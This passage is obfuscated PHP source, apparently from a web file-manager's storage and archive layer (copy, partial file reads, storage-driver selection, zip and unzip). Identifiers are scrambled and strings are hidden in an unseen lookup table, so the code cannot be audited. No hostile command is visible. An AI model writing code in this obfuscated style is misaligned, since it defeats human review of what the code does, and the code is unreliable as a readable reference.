$Ä‚ğ¿¦ [84]); $­¦ûİì™ = array(); $¦ÍËÈ’ = array(); foreach ($¢–ìØ¬ as $Ü”¹Şóë => $šëÒê»Ï) { if (isset($ºÄÅ‡æ¢[$Ü”¹Şóë])) { if ($šëÒê»Ï[$Ä‚ğ¿¦ [75]] == 1) { continue; } if ($ºÄÅ‡æ¢[$Ü”¹Şóë][$Ä‚ğ¿¦ [76]] == $šëÒê»Ï[$Ä‚ğ¿¦ [76]]) { continue; } } if ($šëÒê»Ï[$Ä‚ğ¿¦ [75]] == 1) { $¦ÍËÈ’[] = $ÖïØ²İ . $Ä‚ğ¿¦ [8] . trim($Ü”¹Şóë, $Ä‚ğ¿¦ [8]); continue; } $É½äïÕ† = strstr(trim($Ü”¹Şóë, $Ä‚ğ¿¦ [8]), $Ä‚ğ¿¦ [8]) ? get_path_father($Ü”¹Şóë) : $Ä‚ğ¿¦ [12]; $­¦ûİì™[] = array($Ä‚ğ¿¦ [1180] => $šëÒê»Ï[$Ä‚ğ¿¦ [86]], $Ä‚ğ¿¦ [1181] => rtrim($ÖïØ²İ, $Ä‚ğ¿¦ [8]) . $Ä‚ğ¿¦ [8] . $É½äïÕ†, $Ä‚ğ¿¦ [1182] => $šëÒê»Ï); } $¥Ò¨÷§û = array($Ä‚ğ¿¦ [200] => $­¦ûİì™, $Ä‚ğ¿¦ [75] => $¦ÍËÈ’); Hook::trigger($Ä‚ğ¿¦ [1183], $÷÷…ÕÇ«, $ÖïØ²İ, $¥Ò¨÷§û); foreach ($¦ÍËÈ’ as $šëÒê»Ï) { IO::mkdir($šëÒê»Ï); } foreach ($­¦ûİì™ as $šëÒê»Ï) { IO::copy($šëÒê»Ï[$Ä‚ğ¿¦ [1180]], $šëÒê»Ï[$Ä‚ğ¿¦ [1181]], REPEAT_REPLACE); } } public static function fileSubstr($ÎîÇ÷ù, $çÈÏ»Şà, $‘úúÇŞà = false) { $ˆ¹›¦ÕÍ =& $_SERVER[¡“ËÌ§œ]; $¶¾ü¥›ø = self::driverMake($ÎîÇ÷ù); $¶ıûš¨ï = $¶¾ü¥›ø->size($ÎîÇ÷ù); $Ãá±áñÏ = $çÈÏ»Şà; $ü³€“·€ = $‘úúÇŞà; if ($çÈÏ»Şà < 0) { $çÈÏ»Şà = $¶ıûš¨ï + $çÈÏ»Şà; } if ($‘úúÇŞà === !1) { $‘úúÇŞà = $¶ıûš¨ï - $çÈÏ»Şà; } if ($çÈÏ»Şà + $‘úúÇŞà > $¶ıûš¨ï) { $‘úúÇŞà = $¶ıûš¨ï - $çÈÏ»Şà; } if (!$¶ıûš¨ï && $¶¾ü¥›ø->getType() == $ˆ¹›¦ÕÍ[106] && !$¶¾ü¥›ø->exist($ÎîÇ÷ù)) { $´¿‚ŸÑ = get_path_this($ÎîÇ÷ù); $Ì…ˆµ¤¨ = parse_url_query($´¿‚ŸÑ); if (is_array($Ì…ˆµ¤¨) && isset($Ì…ˆµ¤¨[$ˆ¹›¦ÕÍ[32]])) { $´¿‚ŸÑ = urldecode($Ì…ˆµ¤¨[$ˆ¹›¦ÕÍ[32]]); } throw new Exception($ˆ¹›¦ÕÍ[1184] . LNG($ˆ¹›¦ÕÍ[1185]) . $ˆ¹›¦ÕÍ[986] . clear_html($´¿‚ŸÑ) . $ˆ¹›¦ÕÍ[12]); } if ($‘úúÇŞà <= 0) { return $ˆ¹›¦ÕÍ[12]; } if ($çÈÏ»Şà < 0 || $çÈÏ»Şà >= $¶ıûš¨ï || $‘úúÇŞà > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\x65\x52\x65\141\144\x20\145\x72\x72\157\162\x21\x20\x73\x74\x61\x72\x74\x3d{$çÈÏ»Şà}\x3b\x6c\145\156\147\x74\150\x3d{$‘úúÇŞà}\73\40\163\x69\172\145\x3d{$¶ıûš¨ï}\73"); } $Ø—·€Ë¤ = $¶¾ü¥›ø->fileSubstr($ÎîÇ÷ù, $çÈÏ»Şà, $‘úúÇŞà); if (!$Ø—·€Ë¤ && $‘úúÇŞà && isset($GLOBALS[$ˆ¹›¦ÕÍ[1186]])) { throw new Exception($GLOBALS[$ˆ¹›¦ÕÍ[1186]][$ˆ¹›¦ÕÍ[1187]]); } return $Ø—·€Ë¤; } private static function driverMake(&$Á—Öú‡€) { $Ô¸ÙšÄ² =& $_SERVER[¡“ËÌ§œ]; $ÒµÊÖÔå = KodIO::parse($Á—Öú‡€); if (!self::$driverListSystem) { $Ä‡‡ó¨ = Model($Ô¸ÙšÄ²[787])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Ä‡‡ó¨, $Ô¸ÙšÄ²[437]); } if ($ÒµÊÖÔå[$Ô¸ÙšÄ²[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ÒµÊÖÔå[$Ô¸ÙšÄ²[437]]]) { return !1; } $Á—Öú‡€ = $ÒµÊÖÔå[$Ô¸ÙšÄ²[1188]]; $ÆÇ†Ó¿² = self::driverGet($ÒµÊÖÔå, $Á—Öú‡€); return $ÆÇ†Ó¿²; } private static function driverGet($úƒ»³‡µ, &$¼¡°´²Ø) { $Á©üİµ– =& $_SERVER[¡“ËÌ§œ]; $­½‹»£İ = $úƒ»³‡µ[$Á©üİµ–[1189]]; $İãßØ’ø = $úƒ»³‡µ[$Á©üİµ–[437]]; switch ($úƒ»³‡µ[$Á©üİµ–[33]]) { case KodIO::KOD_IO: $‰¹ÂŞ « = self::$driverListSystem[$İãßØ’ø]; break; case KodIO::KOD_SOURCE: $¼¡°´²Ø = $İãßØ’ø . $¼¡°´²Ø; $‰¹ÂŞ « = array($Á©üİµ–[1190] => $Á©üİµ–[1191], $Á©üİµ–[6] => $úƒ»³‡µ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¸âÚ‡¦· = $GLOBALS[$Á©üİµ–[1192]]; self::$driverListUser = array_to_keyvalue($¸âÚ‡¦·, $Á©üİµ–[437]); } $‰¹ÂŞ « = self::$driverListUser[$İãßØ’ø]; break; case KodIO::KOD_SHARE_LINK: $‰¹ÂŞ « = array($Á©üİµ–[1190] => $Á©üİµ–[1193], $Á©üİµ–[6] => $úƒ»³‡µ); $õù·à§‰ = Action($Á©üİµ–[1194])->sharePathInfo($úƒ»³‡µ[$Á©üİµ–[84]]); $¼¡°´²Ø = $õù·à§‰[$Á©üİµ–[440]]; if (!$õù·à§‰[$Á©üİµ–[440]]) { $¬ğÙıîå = Model($Á©üİµ–[630])->getInfo($õù·à§‰[$Á©üİµ–[631]]); $¼¡°´²Ø = KodIO::clear($¬ğÙıîå[$Á©üİµ–[1195]] . $úƒ»³‡µ[$Á©üİµ–[1188]]); $úƒ»³‡µ[$Á©üİµ–[524]] = $¬ğÙıîå; $úƒ»³‡µ[$Á©üİµ–[1171]] = $¼¡°´²Ø; $‰¹ÂŞ « = array($Á©üİµ–[1190] => $Á©üİµ–[1196], $Á©üİµ–[6] => $úƒ»³‡µ); } break; case KodIO::KOD_SHARE_ITEM: $‰¹ÂŞ « = array($Á©üİµ–[1190] => $Á©üİµ–[1197], $Á©üİµ–[6] => $úƒ»³‡µ); $¬ğÙıîå = Model($Á©üİµ–[630])->getInfo($úƒ»³‡µ[$Á©üİµ–[437]]); if ($¬ğÙıîå[$Á©üİµ–[440]] == $Á©üİµ–[198]) { $¼¡°´²Ø = KodIO::clear($¬ğÙıîå[$Á©üİµ–[1195]] . $úƒ»³‡µ[$Á©üİµ–[1188]]); $úƒ»³‡µ[$Á©üİµ–[524]] = $¬ğÙıîå; $úƒ»³‡µ[$Á©üİµ–[1171]] = $¼¡°´²Ø; $‰¹ÂŞ « = array($Á©üİµ–[1190] => $Á©üİµ–[1198], $Á©üİµ–[6] => $úƒ»³‡µ); } else { if (!$¼¡°´²Ø) { $¼¡°´²Ø = $¬ğÙıîå[$Á©üİµ–[440]]; } } break; default: $¼¡°´²Ø = $úƒ»³‡µ[$Á©üİµ–[84]]; $‰¹ÂŞ « = array($Á©üİµ–[1190] => $Á©üİµ–[1199]); break; } $ŠÁ…¤¶´ = $úƒ»³‡µ[$Á©üİµ–[84]]; if (!isset(self::$driverCache[$ŠÁ…¤¶´])) { $Ÿ«ãÉÁ¨ = strtolower($‰¹ÂŞ «[$Á©üİµ–[95]]); $ªÑ£æÀ = $GLOBALS[$Á©üİµ–[6]][$Á©üİµ–[89]][$Á©üİµ–[846]]; $ã¹´½¯İ = $Á©üİµ–[74] . (isset($ªÑ£æÀ[$Ÿ«ãÉÁ¨]) ? $ªÑ£æÀ[$Ÿ«ãÉÁ¨] : ucfirst($Ÿ«ãÉÁ¨)); if (!class_exists($ã¹´½¯İ)) { show_json("{$ã¹´½¯İ}\x20\x6e\157\x74\40\x65\x78\x69\x73\164\163\x21", !1); } $›áÖÂ²© = isset($‰¹ÂŞ «[$Á©üİµ–[6]]) ? $‰¹ÂŞ «[$Á©üİµ–[6]] : !1; self::$driverCache[$ŠÁ…¤¶´] = new $ã¹´½¯İ($›áÖÂ²©); } $»©í¹³ª = self::$driverCache[$ŠÁ…¤¶´]; $»©í¹³ª->pathDriver = $­½‹»£İ; $»©í¹³ª->pathBase = $Á©üİµ–[12]; if (isset($‰¹ÂŞ «[$Á©üİµ–[6]][$Á©üİµ–[1200]])) { $»©í¹³ª->pathBase = rtrim($‰¹ÂŞ «[$Á©üİµ–[6]][$Á©üİµ–[1200]], $Á©üİµ–[8]) . $Á©üİµ–[8]; $¼¡°´²Ø = $»©í¹³ª->pathBase . ltrim($¼¡°´²Ø, $Á©üİµ–[8]); } $¼¡°´²Ø = $»©í¹³ª->getPath($¼¡°´²Ø); if (isset($úƒ»³‡µ[$Á©üİµ–[1171]])) { $¼¡°´²Ø = $úƒ»³‡µ[$Á©üİµ–[1171]]; } $»©í¹³ª->path = $¼¡°´²Ø; return $»©í¹³ª; } public static function errorTips($˜È÷È²ü = false) { $ÙÅç¨Ñ =& $_SERVER[¡“ËÌ§œ]; static $Â¾¨…œ = array(); $Ç€ÓÌÍˆ = 1000; if ($˜È÷È²ü === -1) { return $Â¾¨…œ ? $Â¾¨…œ[count($Â¾¨…œ) - 1] : $ÙÅç¨Ñ[12]; } if ($˜È÷È²ü === !1) { return implode($ÙÅç¨Ñ[231], $Â¾¨…œ); } if (count($Â¾¨…œ) >= $Ç€ÓÌÍˆ) { $Â¾¨…œ = array_slice($Â¾¨…œ, $Ç€ÓÌÍˆ * 0.5, $Ç€ÓÌÍˆ); } $Â¾¨…œ[] = $˜È÷È²ü; write_log($ÙÅç¨Ñ[162] . ACTION . $ÙÅç¨Ñ[1201] . $˜È÷È²ü, $ÙÅç¨Ñ[1202]); } public static function getLastError($×‹…í³¬ = '') { $å´ì·¿ = self::errorTips(-1); return $å´ì·¿ ? $å´ì·¿ : $×‹…í³¬; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ÜÉ³‰·; if ($ÜÉ³‰·) { return $ÜÉ³‰·; } $ê×ÃºµÀ = IO::init($_SERVER[¡“ËÌ§œ][8]); return $ê×ÃºµÀ; } private static function iconvSystem($¥ä“ÆÜ) { return self::local()->iconvSystem($¥ä“ÆÜ); } private static function iconvApp($«¾¯£Œ) { return self::local()->iconvApp($«¾¯£Œ); } public static function zipFolder($ì­‡—·Ï, $ÉÜÚ£ï‡ = "\x7a\151\x70", $µë¨üÛ = '', $ œ“‚¾æ = REPEAT_RENAME) { $ÃÌï¢ÀÀ =& $_SERVER[¡“ËÌ§œ]; $£¸ƒêõ¬ = IO::listPath($ì­‡—·Ï); if (!$£¸ƒêõ¬) { return !1; } $£¸ƒêõ¬ = array_merge($£¸ƒêõ¬[$ÃÌï¢ÀÀ[82]], $£¸ƒêõ¬[$ÃÌï¢ÀÀ[83]]); return self::zip($£¸ƒêõ¬, $ÉÜÚ£ï‡, $µë¨üÛ, $ œ“‚¾æ); } public static function zip($†šº›¥İ, $ÇäØš½ğ = "\x7a\151\x70", $ßº©»æò = '', $Ö¤«³Ÿ„ = REPEAT_RENAME) { $‚ô–ŒÇ =& $_SERVER[¡“ËÌ§œ]; if (is_string($†šº›¥İ) && $†šº›¥İ) { $†šº›¥İ = array(array($‚ô–ŒÇ[84] => $†šº›¥İ)); } $ÒóøÕø£ = self::init($†šº›¥İ[0][$‚ô–ŒÇ[84]]); $Æè‰±²ç = self::info($†šº›¥İ[0][$‚ô–ŒÇ[84]]); $ß„ßí•¤ = $‚ô–ŒÇ[12]; $¤îÀ…‘“ = $‚ô–ŒÇ[12]; $‰æˆÍïÅ = $‚ô–ŒÇ[12]; if ($ßº©»æò && substr($ßº©»æò, -1, 1) != $‚ô–ŒÇ[8]) { $¤îÀ…‘“ = get_path_father($ßº©»æò); $‰æˆÍïÅ = get_path_this($ßº©»æò); } else { $¤îÀ…‘“ = self::pathFather($Æè‰±²ç[$‚ô–ŒÇ[84]]); $‰æˆÍïÅ = $Æè‰±²ç[$‚ô–ŒÇ[32]] . $‚ô–ŒÇ[10] . $ÇäØš½ğ; if (count($†šº›¥İ) > 1) { $†â™üÔç = IO::info($¤îÀ…‘“); $‰æˆÍïÅ = $†â™üÔç[$‚ô–ŒÇ[32]] . $‚ô–ŒÇ[10] . $ÇäØš½ğ; } if ($ßº©»æò) { $¤îÀ…‘“ = $ßº©»æò; } } if ($ÒóøÕø£->getType() == $‚ô–ŒÇ[106]) { $—Õ·¢Úú = self::init($¤îÀ…‘“); $›õâ“Ğ = $—Õ·¢Úú->getType() == $‚ô–ŒÇ[106] ? $¤îÀ…‘“ : get_path_father($ÒóøÕø£->path); $›õâ“Ğ = rtrim($›õâ“Ğ, $‚ô–ŒÇ[8]) . $‚ô–ŒÇ[8]; mk_dir($›õâ“Ğ); } else { $ß„ßí•¤ = TEMP_FILES . $‚ô–ŒÇ[1203] . time() . rand_string(8) . $‚ô–ŒÇ[8]; mk_dir($ß„ßí•¤); file_put_contents($ß„ßí•¤ . $‚ô–ŒÇ[1204], $‚ô–ŒÇ[12]); $›õâ“Ğ = $ß„ßí•¤; } $¤——æ²ó = IO::info($›õâ“Ğ); if (!$¤——æ²ó || !$¤——æ²ó[$‚ô–ŒÇ[203]]) { show_json(LNG($‚ô–ŒÇ[1205]), !1); } $Ò‡å…‡í = self::zipFileList($†šº›¥İ, $ß„ßí•¤); foreach ($Ò‡å…‡í as $öº÷šˆ… => $×“å¹Ö…) { $Ò‡å…‡í[$öº÷šˆ…] = self::iconvSystem($×“å¹Ö…); } $Çë©˜òñ = get_filename_auto($›õâ“Ğ . $‰æˆÍïÅ, $‚ô–ŒÇ[12], $Ö¤«³Ÿ„); KodArchive::create(self::iconvSystem($Çë©˜òñ), $Ò‡å…‡í); if (!IO::exist($Çë©˜òñ)) { if ($ß„ßí•¤) { del_dir($ß„ßí•¤); } show_json(LNG($‚ô–ŒÇ[1206]), !1); } if (!$ß„ßí•¤) { return $Çë©˜òñ; } $Ä”¡¿û© = self::move($Çë©˜òñ, $¤îÀ…‘“, $Ö¤«³Ÿ„); if ($ß„ßí•¤) { del_dir($ß„ßí•¤); } if (!$Çë©˜òñ) { show_json(LNG($‚ô–ŒÇ[1206]), !1); } return $Ä”¡¿û©; } public static function unzip($ÚğòğÙà, $úÍà•ë¯, $¨±¾”¡˜ = "\x2d\x31", $Æ¸²¢à = "\x72\145\x70\x6c\141\143\145") { $Œà—ÇÇü =& $_SERVER[¡“ËÌ§œ]; $¹Âó³ÖÒ = parent::info($ÚğòğÙà); if (!$¹Âó³ÖÒ) { show_json(LNG($Œà—ÇÇü[1207]), !1); } $Ì¤»Ø–æ = IO::infoFull($úÍà•ë¯); if (!$Ì¤»Ø–æ) { $úÍà•ë¯ = IO::mkdir($úÍà•ë¯); } if (isset($Ì¤»Ø–æ[$Œà—ÇÇü[440]]) && trim($Ì¤»Ø–æ[$Œà—ÇÇü[84]], $Œà—ÇÇü[8]) != trim($úÍà•ë¯, $Œà—ÇÇü[8])) { $‚„ºşıü = KodIO::make($Ì¤»Ø–æ[$Œà—ÇÇü[470]]); $¼ñ°Øßâ = IO::fileNameAuto($‚„ºşıü, $Ì¤»Ø–æ[$Œà—ÇÇü[32]], REPEAT_RENAME_FOLDER, !0); $úÍà•ë¯ = IO::mkdir($‚„ºşıü . $¼ñ°Øßâ); } $¨±¾”¡˜ = $¨±¾”¡˜ && $¨±¾”¡˜ != $Œà—ÇÇü[1208] ? @json_decode($¨±¾”¡˜, !0) : -1; $î‚ÕÔ€Ä = self::unzipPart($ÚğòğÙà, $¨±¾”¡˜); if (!$î‚ÕÔ€Ä || !IO::exist($î‚ÕÔ€Ä[$Œà—ÇÇü[200]])) { show_json(LNG($Œà—ÇÇü[105]), !1); } $¬Ù’Çñ = $î‚ÕÔ€Ä[$Œà—ÇÇü[1209]][count($î‚ÕÔ€Ä[$Œà—ÇÇü[1209]]) - 1]; if ($¬Ù’Çñ[$Œà—ÇÇü[1210]] == -1 || substr($¬Ù’Çñ[$Œà—ÇÇü[32]], -1, 1) == $Œà—ÇÇü[8]) { $“Â™„¯è = $î‚ÕÔ€Ä[$Œà—ÇÇü[1211]] . rand_string(10) . $Œà—ÇÇü[8]; mk_dir($“Â™„¯è); $¦šò±Ò = count($î‚ÕÔ€Ä[$Œà—ÇÇü[1209]]) == 1 ? IO::ext($ÚğòğÙà) : get_path_ext($î‚ÕÔ€Ä[$Œà—ÇÇü[200]]); $ßï†ıÀ‰ = KodArchive::extract(self::iconvSystem($î‚ÕÔ€Ä[$Œà—ÇÇü[200]]), $“Â™„¯è, $¬Ù’Çñ[$Œà—ÇÇü[1210]], $¼ñ°Øßâ, $¦šò±Ò); self::unzipErrorCheck($ßï†ıÀ‰, array($Œà—ÇÇü[1212], $ÚğòğÙà, $¦šò±Ò, $úÍà•ë¯, $î‚ÕÔ€Ä)); Hook::trigger($Œà—ÇÇü[1213], $“Â™„¯è); recursion_dir($“Â™„¯è, $ŒûõáÌº, $‡ŸáÜ›µ, 0); $ ’˜¼Ş½ = array_merge($ŒûõáÌº, $‡ŸáÜ›µ); $øùÙ¯Ùº = array(); foreach ($ ’˜¼Ş½ as $®‡°«—) { $€ãÉÅ¿¨ = IO::move(self::iconvApp($®‡°«—), $úÍà•ë¯, $Æ¸²¢à); if ($€ãÉÅ¿¨) { $øùÙ¯Ùº[] = $€ãÉÅ¿¨; } } del_dir($“Â™„¯è); } else { $€ãÉÅ¿¨ = IO::move($î‚ÕÔ€Ä[$Œà—ÇÇü[200]], $úÍà•ë¯, $Æ¸²¢à, get_path_this($¬Ù’Çñ[$Œà—ÇÇü[32]])); if ($€ãÉÅ¿¨) { $øùÙ¯Ùº[] = $€ãÉÅ¿¨; } } return $øùÙ¯Ùº ? $øùÙ¯Ùº : !1; } public static function unzipList($«–ªÅèì) { $¾™ªíŞ‡ =& $_SERVER[¡“ËÌ§œ]; $ä¢ìÚüß = isset($«–ªÅèì[$¾™ªíŞ‡[1214]]) ? $«–ªÅèì[$¾™ªíŞ‡[1214]] : !1; $¦šÉŒ³å = isset($«–ªÅèì[$¾™ªíŞ‡[1210]]) ? @json_decode($«–ªÅèì[$¾™ªíŞ‡[1210]], !0) : -1; $¨½İßÚ“ = self::unzipPart($«–ªÅèì[$¾™ªíŞ‡[84]], $¦šÉŒ³å); if (!$¨½İßÚ“ || !IO::exist($¨½İßÚ“[$¾™ªíŞ‡[200]])) { show_json(LNG($¾™ªíŞ‡[105]), !1); } $‡ñ§ÃÕ = $¨½İßÚ“[$¾™ªíŞ‡[1209]][count($¨½İßÚ“[$¾™ªíŞ‡[1209]]) - 1]; $÷ì ëª = in_array(IO::ext($¨½İßÚ“[$¾™ªíŞ‡[200]]), array($¾™ªíŞ‡[342], $¾™ªíŞ‡[1215], $¾™ªíŞ‡[1216], $¾™ªíŞ‡[1217], $¾™ªíŞ‡[1218], $¾™ªíŞ‡[1219])); if (!$ä¢ìÚüß && ($‡ñ§ÃÕ[$¾™ªíŞ‡[1210]] == -1 || $÷ì ëª)) { $×âÆšşº = $¨½İßÚ“[$¾™ªíŞ‡[1211]] . get_path_this($¨½İßÚ“[$¾™ªíŞ‡[200]]) . $¾™ªíŞ‡[1220]; if (!IO::exist($×âÆšşº)) { $Ö²¿ò± = $‡ñ§ÃÕ[$¾™ªíŞ‡[1210]] == -1 ? get_path_ext(IO::pathThis($«–ªÅèì[$¾™ªíŞ‡[84]])) : get_path_ext($¨½İßÚ“[$¾™ªíŞ‡[200]]); $†ğÀêÀş = KodArchive::listContent(self::iconvSystem($¨½İßÚ“[$¾™ªíŞ‡[200]]), !0, $Ö²¿ò±); self::unzipErrorCheck($†ğÀêÀş, array($¾™ªíŞ‡[1221], $«–ªÅèì, $¨½İßÚ“)); @file_put_contents($×âÆšşº, json_encode($†ğÀêÀş[$¾™ªíŞ‡[1222]])); } return @json_decode(IO::getContent($×âÆšşº), !0); } IO::fileOut($¨½İßÚ“[$¾™ªíŞ‡[200]], $ä¢ìÚüß, get_path_this($‡ñ§ÃÕ[$¾™ªíŞ‡[32]])); die; } private static function zipFileList($¿£Ó“ĞÒ, $Ù˜®«Ø = false) { $»«Ìóîµ =& $_SERVER[¡“ËÌ§œ]; $¬ú³€õ‰ = array(); foreach ($¿£Ó“ĞÒ as $ ¨º¯Ş›) { $Û‚ÌØÜ‹ = $ ¨º¯Ş›[$»«Ìóîµ[84]]; if ($Ù˜®«Ø) { $Û‚ÌØÜ‹ = self::copy($ ¨º¯Ş›[$»«Ìóîµ[84]], $Ù˜®«Ø, $»«Ìóîµ[838]); } else { $µ¬±ØŸÓ = self::init($ ¨º¯Ş›[$»«Ìóîµ[84]]); if ($µ¬±ØŸÓ->getType() == $»«Ìóîµ[106]) { $Û‚ÌØÜ‹ = $µ¬±ØŸÓ->path; } } if ($Û‚ÌØÜ‹ && self::local()->exist($Û‚ÌØÜ‹)) { $¬ú³€õ‰[$ ¨º¯Ş›[$»«Ìóîµ[84]]] = $Û‚ÌØÜ‹; } } if (!empty($¬ú³€õ‰)) { return array_values($¬ú³€õ‰); } show_json(LNG($»«Ìóîµ[1185]), !1); } private static function localFilePath($Ê„óÌ»÷) { $ó¯Í¥ĞÄ =& $_SERVER[¡“ËÌ§œ]; $…û¢ĞÊê = KodIO::parse($Ê„óÌ»÷); if ($…û¢ĞÊê[$ó¯Í¥ĞÄ[33]] == KodIO::KOD_SOURCE) { $óâÈåŒ¥ = Model($ó¯Í¥ĞÄ[845])->fileInfoGet(KodIO::sourceID($Ê„óÌ»÷)); if (!$óâÈåŒ¥[$ó¯Í¥ĞÄ[84]]) { show_json($ó¯Í¥ĞÄ[1223], !1); } $Ê„óÌ»÷ = $óâÈåŒ¥[$ó¯Í¥ĞÄ[84]]; } $ó¨Üİªñ = self::init($Ê„óÌ»÷); if ($ó¨Üİªñ->pathParse[$ó¯Í¥ĞÄ[1171]]) { $Ê„óÌ»÷ = $ó¨Üİªñ->pathParse[$ó¯Í¥ĞÄ[1171]]; $ó¨Üİªñ = self::init($Ê„óÌ»÷); } $¤Ç§¯¯é = $ó¨Üİªñ->getType(); if ($¤Ç§¯¯é == $ó¯Í¥ĞÄ[106] || $¤Ç§¯¯é == $ó¯Í¥ĞÄ[1224]) { if (!$ó¨Üİªñ->exist($ó¨Üİªñ->path)) { show_json(LNG($ó¯Í¥ĞÄ[105]), !1); } return $ó¨Üİªñ->path; } return !1; } public static function unzipPart($÷ØÅé€á, $¤†Õã² = -1) { $‘òÔïãÄ =& $_SERVER[¡“ËÌ§œ]; $‚Éš™«ö = IO::pathThis($÷ØÅé€á); if (!$¤†Õã² || $¤†Õã² == -1) { $«ÅÌÁŸ× = array(array($‘òÔïãÄ[32] => $‚Éš™«ö, $‘òÔïãÄ[1210] => -1)); $«ÅÌÁŸ×[0][$‘òÔïãÄ[1225]] = $«ÅÌÁŸ×[0][$‘òÔïãÄ[32]]; } else { if (is_array($¤†Õã²)) { $«ÅÌÁŸ× = $¤†Õã²; $‰êàü²² = count($«ÅÌÁŸ×) - 1; for ($ÆøŞ÷ŒÆ = 0; $ÆøŞ÷ŒÆ <= $‰êàü²²; $ÆøŞ÷ŒÆ++) { $íÑŒŞ› = $«ÅÌÁŸ×[$ÆøŞ÷ŒÆ]; $şƒ“Ë—À = get_path_this($íÑŒŞ›[$‘òÔïãÄ[32]]) . (checkExtSafe($íÑŒŞ›[$‘òÔïãÄ[32]]) ? $‘òÔïãÄ[12] : $‘òÔïãÄ[1226]); $«ÅÌÁŸ×[$ÆøŞ÷ŒÆ][$‘òÔïãÄ[1225]] = $‘òÔïãÄ[1227] . intval($íÑŒŞ›[$‘òÔïãÄ[1210]]) . $‘òÔïãÄ[415] . $şƒ“Ë—À; if ($ÆøŞ÷ŒÆ == 0) { continue; } $«ÅÌÁŸ×[$ÆøŞ÷ŒÆ][$‘òÔïãÄ[1225]] = $«ÅÌÁŸ×[$ÆøŞ÷ŒÆ - 1][$‘òÔïãÄ[1225]] . $‘òÔïãÄ[1228] . $«ÅÌÁŸ×[$ÆøŞ÷ŒÆ][$‘òÔïãÄ[1225]]; } } } if (!is_array($«ÅÌÁŸ×) || count($«ÅÌÁŸ×) == 0) { return !1; } $÷šÍ… = $«ÅÌÁŸ×[count($«ÅÌÁŸ×) - 1]; if (!IO::exist($÷ØÅé€á)) { return !1; } $ØƒµÚ¡‹ = TEMP_FILES . $‘òÔïãÄ[1229] . kodIO::hashPathSafe($÷ØÅé€á) . $‘òÔïãÄ[8]; $’Ğ»œÊ = $ØƒµÚ¡‹ . $÷šÍ…[$‘òÔïãÄ[1225]]; mk_dir($ØƒµÚ¡‹); file_put_contents(TEMP_FILES . $‘òÔïãÄ[1204], $‘òÔïãÄ[12]); if (IO::exist($’Ğ»œÊ)) { return array($‘òÔïãÄ[200] => $’Ğ»œÊ, $‘òÔïãÄ[1209] => $«ÅÌÁŸ×, $‘òÔïãÄ[1211] => $ØƒµÚ¡‹); } $†şªîñ = self::localFilePath($÷ØÅé€á); if (!$†şªîñ) { $†şªîñ = $ØƒµÚ¡‹ . $‘òÔïãÄ[1230]; if (!IO::exist($†şªîñ)) { self::copy($÷ØÅé€á, $ØƒµÚ¡‹, !1, get_path_this($†şªîñ)); } } if (!$†şªîñ || !IO::exist($†şªîñ)) { return !1; } if ($÷šÍ…[$‘òÔïãÄ[1210]] == -1) { return array($‘òÔïãÄ[200] => $†şªîñ, $‘òÔïãÄ[1209] => $«ÅÌÁŸ×, $‘òÔïãÄ[1211] => $ØƒµÚ¡‹); } $‡‹îÅˆ = $†şªîñ; foreach ($«ÅÌÁŸ× as $ÆøŞ÷ŒÆ => $íÑŒŞ›) { if (!$íÑŒŞ› || $íÑŒŞ›[$‘òÔïãÄ[1210]] == $‘òÔïãÄ[1208]) { break; } if (substr($íÑŒŞ›[$‘òÔïãÄ[32]], -1, 1) == $‘òÔïãÄ[8]) { break; } $äŠ¤ßëÖ = in_array(get_path_ext($íÑŒŞ›[$‘òÔïãÄ[1225]]), array($‘òÔïãÄ[342], $‘òÔïãÄ[1215], $‘òÔïãÄ[1216], $‘òÔïãÄ[1217], $‘òÔïãÄ[1218], $‘òÔïãÄ[1219])); $²½ë¯ß§ = $ÆøŞ÷ŒÆ == count($«ÅÌÁŸ×) - 1 && $äŠ¤ßëÖ; $±íå´İÌ = $ØƒµÚ¡‹ . $íÑŒŞ›[$‘òÔïãÄ[1225]]; $˜¯ÅòŒ¹ = $ØƒµÚ¡‹ . get_path_this($íÑŒŞ›[$‘òÔïãÄ[32]]); if (IO::exist($±íå´İÌ)) { $‡‹îÅˆ = $±íå´İÌ; continue; } $˜¡ƒÄĞ¡ = $ÆøŞ÷ŒÆ == 0 ? get_path_ext($‚Éš™«ö) : get_path_ext($‡‹îÅˆ); $¡Í‚ÃùÅ = KodArchive::extract(self::iconvSystem($‡‹îÅˆ), $ØƒµÚ¡‹, $íÑŒŞ›[$‘òÔïãÄ[1210]], $¦±¼ş , $˜¡ƒÄĞ¡); self::unzipErrorCheck($¡Í‚ÃùÅ, array($‘òÔïãÄ[1231], $÷ØÅé€á, $«ÅÌÁŸ×, $íÑŒŞ›, $±íå´İÌ)); if (IO::exist($˜¯ÅòŒ¹)) { IO::rename($˜¯ÅòŒ¹, get_path_this($±íå´İÌ)); } $‡‹îÅˆ = $±íå´İÌ; } $’Ğ»œÊ = $‡‹îÅˆ; return array($‘òÔïãÄ[200] => $‡‹îÅˆ, $‘òÔïãÄ[1209] => $«ÅÌÁŸ×, $‘òÔïãÄ[1211] => $ØƒµÚ¡‹); } private static function unzipErrorCheck($ƒÏ·çù, $©£í„Û— = false) { $¼—èÎÛÍ =& $_SERVER[¡“ËÌ§œ]; if ($ƒÏ·çù[$¼—èÎÛÍ[1232]]) { return !0; } write_log(array($¼—èÎÛÍ[1233], $ƒÏ·çù, $©£í„Û—), $¼—èÎÛÍ[1234]); show_json($¼—èÎÛÍ[1235] . json_encode($ƒÏ·çù[$¼—èÎÛÍ[1222]]), !1); die; } } goto B›–½òÆæ; C®¤éÒíà: define($_SERVER[¡“ËÌ§œ][267], 1); define($_SERVER[¡“ËÌ§œ][268], 2); define($_SERVER[¡“ËÌ§œ][269], 3); goto B†­ĞÌÅ„; D¨Í©Ûô’Ô: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($‚¢±¼‡¥) { parent::__construct($‚¢±¼‡¥); $this->signatureVersion($_SERVER[¡“ËÌ§œ][216]); } public function uploadFormData($›—ÎØ¯í, $™–À¨¨ = 3600) { $—¨âÀÓ =& $_SERVER[¡“ËÌ§œ]; $ ¸Ì£« = $—¨âÀÓ[199]; $£³Şáè‡ = $—¨âÀÓ[238]; $¾×¶×ÇÌ = $—¨âÀÓ[62]; $ı¿Ä±»Ë = gmdate($—¨âÀÓ[239]); $’ƒ»êƒ… = gmdate($—¨âÀÓ[240]); 